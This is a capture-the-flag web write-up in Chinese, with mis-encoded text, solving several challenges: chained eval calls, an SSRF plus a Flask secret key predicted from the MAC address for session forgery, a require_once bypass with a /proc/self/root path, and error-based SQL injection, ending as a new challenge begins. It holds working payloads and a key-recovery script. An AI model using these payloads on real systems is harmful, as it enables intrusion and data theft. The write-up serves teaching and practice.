<p>æ‰“å¼€é¡µé¢ï¼Œå¯ä»¥å‘ç°urlä¸Šæœ‰ä¸åŒçš„åœ°æ–¹ï¼Œç„¶åè¿˜å‘Šè¯‰äº†æˆ‘ä»¬çš„ä¿¡æ¯ï¼šæœ‰å¤šå°‘é’»çŸ³å’Œåˆ†æ•°ï¼Œç„¶åå¯ä»¥åœ¨e-shopé‡Œé¢è´­ä¹°é’»çŸ³ï¼Œå¹¶ä¸”å¯ä»¥ç‚¹å‡»Resetè¿›è¡Œé‡ç½®</p>
<p><img src="https://img-blog.csdnimg.cn/62440506dff64e97b32dab7e58f41e3c.png" alt="img"></p>
<p>ä¹‹åç›´æ¥çœ‹æºç å§ï¼š</p>
<p><strong>0x01:å®¡è®¡+è§£é¢˜</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span> <span class="comment"># è·å–flag</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br></pre></td></tr></table></figure>

<p>  -<code>trigger_event</code>å‡½æ•°ç”¨äºå°†eventå…ƒç´ åŠ å…¥sessionçš„logå’Œæ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œå®ç°å¯¹å‡½æ•°çš„æ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span>  </span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event) <span class="comment"># </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>: <span class="comment"># å¦‚æœlogçš„é•¿åº¦å¤§äº5é‚£ä¹ˆåªæˆªå–æœ€åäº”ä½</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]): <span class="comment"># å¦‚æœeventçš„ç±»å‹æ˜¯åˆ—è¡¨ï¼Œé‚£ä¹ˆåŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event) <span class="comment"># äº‹ä»¶é˜Ÿåˆ—æ¥å…¥eventå…ƒç´ </span></span><br></pre></td></tr></table></figure>

<p>  -<code>get_mid_str</code>å‡½æ•°ç”¨äºåœ¨åé¢çš„<code>execute_event_loop</code>å‡½æ•°ä¸­æˆªå–ç”¨äºæ‰§è¡Œçš„å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):] <span class="comment"># è·å–prefixæ‰€åœ¨ç´¢å¼•åŠ ä¸Šprefixé•¿åº¦çš„å€¼</span></span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] <span class="comment"># è·å–postfixå‰é¢çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> haystack</span><br></pre></td></tr></table></figure>

<p>  -<code>execute_event_loop</code>å‡½æ•°ç”¨äºæ‰§è¡Œurlä¸­æˆ‘ä»¬ç”¨getä¼ å…¥çš„å‡½æ•°ï¼Œè€Œæˆ‘ä»¬æ‰€åˆ©ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªå‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œå¤šä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ©ç”¨trigger_eventå°†æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°æ”¾å…¥æ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œä½†æ˜¯ç”±äºevalå‡½æ•°ï¼Œæ‰€ä»¥è¦ç”¨%23ç»•è¿‡ï¼Œä¹‹åå†åœ¨æ¯ä¸ªè¦æ‰§è¡Œçš„å‡½æ•°ä¹‹é—´ç”¨#è¿›è¡Œåˆ†å‰²å°±å®ç°äº†å¤šå‡½æ•°è°ƒç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span> <span class="comment"># æ‰§è¡Œurlä¸Šé¢çš„actionå•¦å°±æ˜¯</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>: <span class="comment"># å½“é˜Ÿåˆ—é•¿åº¦å¤§äº0æ—¶</span></span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># è·å–å…ƒç´ </span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]  <span class="comment"># æˆªå–é˜Ÿåˆ— ç´¢å¼•ä¸º1ä¹‹åçš„å…ƒç´ </span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)): <span class="comment"># å¦‚æœå…ƒç´ ä¸æ˜¯ä»¥xxxä¸ºå¼€å¤´ï¼Œå°±è·³å‡ºå¾ªç¯ï¼Œæ‰¾ä¸‹ä¸€ä¸ªevent</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="comment"># è¿‡æ»¤è¢«ç¦æ­¢çš„å­—ç¬¦</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span> <span class="comment"># åˆ¤æ–­æ˜¯ä¸æ˜¯action</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>) <span class="comment"># è·å–:ä¹‹åå’Œ;ä¹‹å‰çš„å­—ç¬¦ä¸²</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>) <span class="comment"># action;ä¹‹åçš„å­—ç¬¦ä¸² å¹¶ä»¥#ä¸ºåˆ†éš” è¿”å›åˆ—è¡¨</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>)) <span class="comment"># æ‰§è¡Œå‡½æ•° è¿™é‡Œè¦æ³¨æ„trigger_eventçš„ç»“å°¾ä¸æ˜¯handlerä¹Ÿä¸æ˜¯functionï¼Œæ‰€ä»¥å¦‚æœè¦è°ƒç”¨trigger_eventå‡½æ•°ï¼Œå°±è¦ç»•è¿‡</span></span><br><span class="line">                ret_val = event_handler(args) <span class="comment"># é»˜è®¤ä¸ºç¬¬ä¸€ä¸ª å³;åé¢çš„#å‰é¢çš„</span></span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val <span class="comment"># æ‰§è¡Œä¹‹åçš„å€¼æ”¾å…¥respä¸­</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>  -<code>buy_handler</code>å‡½æ•°è´­ä¹°é’»çŸ³ï¼Œå‚æ•°ä¸ºä¹°çš„é’»çŸ³çš„ä¸ªæ•°ï¼Œç„¶åä¹°çš„ä¸ªæ•°åŠ å…¥sessionçš„num_itemsä¸­ï¼Œè¿™é‡Œçš„num_itemsåˆšå¥½å’Œåé¢çš„get_flagå‡½æ•°ç›¸åº”ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å®ç°num_itemsa&gt;=5ï¼Œä½†æ˜¯è¿˜è¦æ³¨æ„åœ¨<code>consume_point_function</code>å‡½æ•°ä¸­çš„æŠ¥é”™<code>RollBackException()</code>ï¼Œè¿™ä¸ªè¦æ±‚ä¸€æ¬¡è´­ä¹°çš„é’»çŸ³ä¸ªæ•°ä¸èƒ½è¶…è¿‡3ä¸ªï¼Œæ‰€ä»¥ä¸èƒ½ä¸€æ¬¡æ€§ä¹°5ä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ†æ¬¡æ•°è´­ä¹°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>  - åœ¨æœ€åçš„<code>get_flag_handler</code>å‡½æ•°ä¸­å¯ä»¥å‘ç°ï¼Œå¦‚æœä¹°åˆ°çš„é’»çŸ³ä¸ªæ•°å¤§äº5çš„è¯ï¼Œå°±å¯ä»¥æ‰§è¡Œtrigger_enentå’ŒFlAGå‡½æ•°å¾—åˆ°flagäº†ï¼Œå¹¶ä¸”trigger_eventå‡½æ•°ä¼šæŠŠå­—ç¬¦ä¸²æ”¾å…¥sessioné‡Œé¢çš„logä¸­ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡çœ‹sessionæ¥å¾—åˆ°flagï¼Œè€Œä»å‰é¢ä¹Ÿå¯ä»¥å‘ç°sessionè¢«åŠ å¯†äº†ï¼Œç›´æ¥ç”¨è„šæœ¬è§£å¯†å°±å¥½å•¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%<span class="number">23</span>;action:buy <span class="number">2</span>;%23action:buy <span class="number">3</span>;%23action:get_flag;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/10a5781779e7402c8d844b331f2e37c4.png" alt="img"></p>
<p>base64è§£å¯†ä¹‹åå¾—åˆ°flag</p>
<h4 id="CISCN2019-Web4"><a href="#CISCN2019-Web4" class="headerlink" title="[CISCN2019]Web4"></a>[CISCN2019]Web4</h4><p>æ‰“å¼€é¡µé¢ï¼Œç‚¹å‡»ä¹‹åå‘ç°ç›´æ¥è½¬åˆ°äº†ç™¾åº¦çš„ç•Œé¢ï¼Œçœ‹urlå°±å¯ä»¥å‘ç°ç€æ‰‹ç‚¹äº†</p>
<p>å¯èƒ½å­˜åœ¨ssrfä¹‹ç±»çš„æ¼æ´ï¼Œç›´æ¥è¯•ç€æŸ¥çœ‹<code>/flag</code>ï¼Œä½†æ˜¯è¿”å›äº†hackerï¼Œè¯´æ˜flagè¢«banäº†</p>
<p>ä¹‹åæŸ¥çœ‹ä¸€äº›æ–‡ä»¶ä¹Ÿçœ‹ä¸å‡ºæœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œé‚£ä¹ˆå°±å…ˆæŠ“ä¸ªåŒ…å§</p>
<p>å‘ç°sessionçš„å€¼å¾ˆæƒ³jwtçš„æ ¼å¼</p>
<p><img src="https://img-blog.csdnimg.cn/69249a08114d405da99883377e9eac70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£å°±ç›´æ¥å»ç”¨è„šæœ¬å¼ºåˆ¶è§£å¯†ä¸€ä¸‹çœ‹çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/3e1de7eb08a7468db3310c29453f2781.png" alt="img"></p>
<p>è§£å¯†ä¹‹åå‘ç°åé¢æ˜¯<code>www-data</code>ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹sessionä¼ªé€ èº«ä»½ï¼Œæ‰æœ‰èµ„æ ¼è®¿é—®</p>
<p>ä½†æ˜¯ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ä¸çŸ¥é“çœŸæ­£çš„ç”¨æˆ·æ˜¯ä»€ä¹ˆï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªæ˜¯ä¸çŸ¥é“åŠ å¯†çš„å¯†é’¥æ˜¯ä»€ä¹ˆï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥çŒœæµ‹å­˜åœ¨pythonæ–‡ä»¶ï¼Œä½†æ˜¯è¯¥æ€ä¹ˆæ‰èƒ½å¾—åˆ°æºç å‘¢</p>
<p>å› ä¸ºè¿™æ˜¯ä¸€ä¸ªflaskæ¡†æ¶ï¼Œä½†æ˜¯å°è¯•ä¹‹åè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæœ€åçœ‹äº†åˆ«äººçš„wp</p>
<p>ï¼ˆä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<p><img src="https://img-blog.csdnimg.cn/3c3a6404d09541cf8760f269c9039626.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å¯ä»¥è¿›è¡Œå®¡è®¡å•¦ï¼Œæ ¹æ®å‰é¢æœ‰<code># encoding:utf-8</code>ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹æ˜¯python2çš„ç¯å¢ƒï¼ˆçº¯ä¸ªäººæ–¹æ³•</p>
<p>å®¡è®¡æºç ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°<code>flag</code>è·¯ç”±ï¼Œä¸”è¦å®ç°usernameä¸ºfuckæ‰èƒ½è¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯æ¥ä¸‹å»è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯†é’¥</p>
<p>é‡ç‚¹åœ¨äºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>

<p>ç™¾åº¦ä¹‹åå¯ä»¥çŸ¥é“ï¼Œrandom.seedé‡Œé¢çš„å€¼æ˜¯ç§å­ï¼Œå­˜åœ¨seedä¹‹åï¼Œå†æ‰§è¡Œrandomå‡½æ•°çš„æ—¶å€™ç”Ÿæˆçš„éšæœºæ•°çš„ä¼ªéšæœºæ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–seedæ¥çŸ¥é“æˆ‘ä»¬éœ€è¦çš„éšæœºæ•°</p>
<p>æ‰€ä»¥ç°åœ¨çš„é‡ç‚¹åœ¨äº<code>uuid.getnode()</code>ï¼Œç™¾åº¦ä¹‹åå‘ç°è¿™ä¸ªæ˜¯ç”¨æ¥è·å–macåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰çš„</p>
<p><img src="https://img-blog.csdnimg.cn/3e3d43e80fee488d9a095e83b4993943.png" alt="img"></p>
<p><a href="https://www.jianshu.com/p/b4102e3e3e96">https://www.jianshu.com/p/b4102e3e3e96</a></p>
<p><img src="https://img-blog.csdnimg.cn/643045d1767940b19f4e01dc5b6889b7.png" alt="img"></p>
<p>æ‰€ä»¥å¾—åˆ°äº†macåœ°å€ï¼ˆ<code>ae:f8:1f:75:7c:c0</code>ï¼‰ï¼Œè€Œseedé‡Œé¢æ˜¯åè¿›åˆ¶ï¼Œæ‰€ä»¥è¦å°†macåœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼š</p>
<p>expï¼šï¼ˆæ³¨æ„è¿™é‡Œè¦ç”¨python2ï¼Œå› ä¸ºpython3å’Œpython2ä¿ç•™çš„å°æ•°ä½æ•°ä¸åŒ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;ae:f8:1f:75:7c:c0&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp, <span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bba999b0f4094a2f8433a60f8fcb0599.png" alt="img"></p>
<p>ä¹‹åç›´æ¥å¯¹sessionåŠ å¯†ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/39ce5103162a43e9940c1c57276c6d34.png" alt="img"></p>
<p>ä¿®æ”¹sessionï¼Œå¹¶è®¿é—®flagè·¯ç”±å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/40cd32a3d29c4da581a02d6c697168b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF-Make-PHP-Great-Again"><a href="#WMCTF-Make-PHP-Great-Again" class="headerlink" title="[WMCTF]Make PHP Great Again"></a>[WMCTF]Make PHP Great Again</h4><ul>
<li>require_onceç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«çš„é™åˆ¶</li>
</ul>
<p>æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">require_once <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  require_once $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»£ç å¾ˆçŸ­,çŸ¥è¯†ç‚¹æ˜¯ç»•è¿‡<code>require_once</code>ä¸èƒ½é‡å¤åŒ…å«çš„é™åˆ¶</p>
<p><a href="https://www.anquanke.com/post/id/213235#h2-0">åˆ†æ</a>ï¼ˆæ…¢æ…¢çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/9938dbfd17074c58a1b8492d7939a72c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF-babyWeb"><a href="#RootersCTF-babyWeb" class="headerlink" title="[RootersCTF]babyWeb"></a>[RootersCTF]babyWeb</h4><ul>
<li>ç®€å•çš„sqlæ³¨å…¥</li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œç›´æ¥å‘Šè¯‰äº†æˆ‘ä»¬banäº†<code>union|sleep|&#39;|&quot;| or |-|benchmark</code>ï¼Œéšä¾¿åœ¨æ¡†é‡Œè¾“å…¥æ•°å­—æ—¶ä¼šå‘ç°è¿™åº”è¯¥æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œæ‰€ä»¥è¢«banæ‰çš„å¼•å·æ²¡æœ‰å°è±¡</p>
<p><img src="https://img-blog.csdnimg.cn/f72394e1795f44f2bc5ea5632c7c0ed0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>è§£æ³•ä¸€ï¼šä¸‡èƒ½å¯†ç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 || 1=1 limit 0,1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8a484268e1104f23a9882f36374f1efd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>è§£æ³•äºŒï¼šæ‰‹æ³¨</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by 2</span><br><span class="line">1^updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select uniqueid from users),0x7e),1)</span><br><span class="line"># ~837461526918364526,123456789928466788~  </span><br></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æŸ¥è¯¢åˆ°çš„uniqueidçš„å€¼ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>ï¼ˆæ³¨ï¼šè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯è¿‡æ»¤äº†å•å¼•å·åœ¨table_name=â€™usersâ€™ä¸­ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼‰</p>
<h4 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h4><p>æ‰“å¼€é¶æœºï¼Œæ— æ³•æ³¨å…¥ï¼Œä½†æ˜¯å¯ä»¥åœ¨feedbacké‡Œé¢å†™å†…å®¹</p>
<p><img src="https://img-blog.csdnimg.cn/93635349daab40f7936d1079951ed897.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
